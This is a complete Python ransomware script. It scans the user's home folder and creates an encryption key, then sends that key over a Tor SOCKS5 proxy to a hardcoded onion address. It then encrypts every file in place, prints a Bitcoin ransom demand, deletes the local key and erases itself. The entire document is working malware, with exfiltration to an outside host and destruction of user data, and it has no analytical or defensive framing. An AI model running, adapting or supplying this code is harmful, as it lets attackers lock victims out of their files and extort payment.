import socket
from cryptography.fernet import Fernet
import os
import sys
from pathlib import Path

def scan_user_folders():
    user_home = Path.home()
    all_files = []
    for root, dirs, files in os.walk(user_home):
        for file in files:
            file_path = os.path.join(root, file)
            all_files.append(file_path)
    return all_files

if __name__ == "__main__":
    files = scan_user_folders()
    print(f"\nFound {len(files)} files.")

    key = Fernet.generate_key()
    with open("key.key", "wb") as thekey:
        thekey.write(key)

    with open("key.key", "r") as file:
        content = file.read()

    proxy_host = "127.0.0.1"
    proxy_port = 9050

    onion_address = "74lt2oxpplb5xhd3aogllmzzfjd2pk7bytp7vciou4auumspijhbqvid.onion"
    onion_port = 12345

    message = content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((proxy_host, proxy_port))

    s.sendall(b"\x05\x01\x00")
    response = s.recv(2)
    if response != b"\x05\x00":
        raise Exception("SOCKS5 proxy authentication failed")

    req = b"\x05"
    req += b"\x01" 
    req += b"\x00"  
    req += b"\x03"
    req += bytes([len(onion_address)])
    req += onion_address.encode()
    req += onion_port.to_bytes(2, "big")

    s.sendall(req)
    resp = s.recv(10)
    if resp[1] != 0x00:
        raise Exception("SOCKS5 connection failed")

    s.sendall(message.encode())
    s.close()

    fernet = Fernet(key)

    for file in files:
        filename = os.path.basename(file)
        if filename in ("ransomware.py", "key.key"):
            continue
        try:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = fernet.encrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
            print(f"Encrypted {file}")
        except Exception as e:
            print(f"Failed to encrypt {file}: {e}")
    print(r"""
___________.__  .__        __ /\        ___________                                   __  .__               
\_   _____/|  | |__| _____/  |)/ ______ \_   _____/ ____   ___________ ___.__._______/  |_|__| ____   ____  
 |    __)_ |  | |  |/  _ \   __\/  ___/  |    __)_ /    \_/ ___\_  __ <   |  |\____ \   __\  |/  _ \ /    \ 
 |        \|  |_|  (  <_> )  |  \___ \   |        \   |  \  \___|  | \/\___  ||  |_> >  | |  (  <_> )   |  \
/_______  /|____/__|\____/|__| /____  > /_______  /___|  /\___  >__|   / ____||   __/|__| |__|\____/|___|  /
        \/                          \/          \/     \/     \/       \/     |__|                       \/ 
""")
    print("you have been infected with ransomware pay 200$ in BTC to this wallet : 123qweasdzxc123")
    os.remove("key.key")
    filename = sys.argv[0]
    # Spawn a new process to delete this file after a delay
    os.system(f"sleep 1 && rm {filename} &")




